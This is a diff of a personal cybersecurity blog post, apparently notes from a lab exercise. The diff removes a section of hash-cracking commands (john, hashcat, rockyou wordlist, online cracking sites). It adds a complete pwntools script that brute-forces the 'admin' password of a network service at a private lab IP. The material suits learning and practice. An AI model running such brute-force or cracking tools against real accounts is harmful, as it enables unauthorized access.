@@ -1,6 +1,6 @@
 ---
-layout: post
-title:  "Ways to crack the hash"
+layout: 
+title:  "Pwntools"
 date:   4 July 2025
 categories: Demo
 tags: Cybersecurity
@@ -8,33 +8,71 @@ tags: Cybersecurity
 <html>
 <body>
 <div markdown="block" style="margin-top: 10px">
+
+### Example 1
+
+```python
+from pwn import *
+
+# Set the host and port
+host = "10.10.55.76"
+port = 8000
+
+# File path for rockyou.txt password list
+password_file = "/usr/share/wordlists/rockyou.txt"
+
+# Connect to the target
+def connect_to_service():
+    return remote(host, port)
+
+# Function to attempt login with a password
+def attempt_password(password):
+    # Connect to the service
+    conn = connect_to_service()
     
-### Intro
-Introduce multiple approaches to crack the hash.
-- **john**
+    # Send 'admin' as the username
+    conn.sendline(b"admin")
+    
+    # Wait for the password prompt
+    conn.recvuntil(b"Password:")
+    
+    # Send the password from the list
+    conn.sendline(password.encode())
 
-    ```bash
-    hashid "HASH_YOU_WANT_TO_CRACK"
-    john --list=formats | grep HASH_TYPE
-    john --format=NT --wordlist=rockyou.txt hash.txt
-    ```
+    # Receive the response and check if we're prompted for a password again
+    response = conn.recvline(timeout=2)
+    response = conn.recvline(timeout=2)
+    # Check if we're asked for the password again (indicates incorrect password)
+    if b"Password:" in response:
+        print(f"Password '{password}' failed.")
+        conn.close()
+        return False
+    elif b"Welcome" in response or b"Success" in response:  # Adjust this based on the actual success message
+        print(f"Password '{password}' might be correct!")
+        conn.close()
+        return True
+    else:
+        # Some other response that might indicate progress (adjust based on your observations)
+        print(f"Unexpected response for password '{password}'. Response: {response}")
+        conn.close()
+        return False
 
-- **hashcat**
-    - First, go [hashcat examples]() search hash types
-    - Then, `hashcat -m 1800 hash.txt rockyou.txt`
-    - If you wanna filter out words with specific length, you can do: `awk "length == 8" rockyou.txt > rockyou_l8.txt`
+# Main function to loop through password list
+def fuzz_passwords():
+    with open(password_file, "r", encoding="latin-1") as f:
+        for password in f:
+            password = password.strip()
+            if attempt_password(password):
+                print(f"Found working password: {password}")
+                break
 
-
-- **Online Tools**
-    - **Crackstation**: [Crackstation](https://crackstation.net/)
-    - **Hashes.com**: [Hashes.com](https://hashes.com/en/decrypt/hash)
-    - **md5decrypt**: [md5decrypt](https://md5decrypt.net/en/#google_vignette)
+if __name__ == "__main__":
+    fuzz_passwords()
+```
 
 
 ## 學習資料
-1. [Crack The Hash](https://tryhackme.com/room/crackthehash)
-2. [Hashcat \| example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-3. [Crackstation](https://crackstation.net/)
+
 
 </div>
 </body>
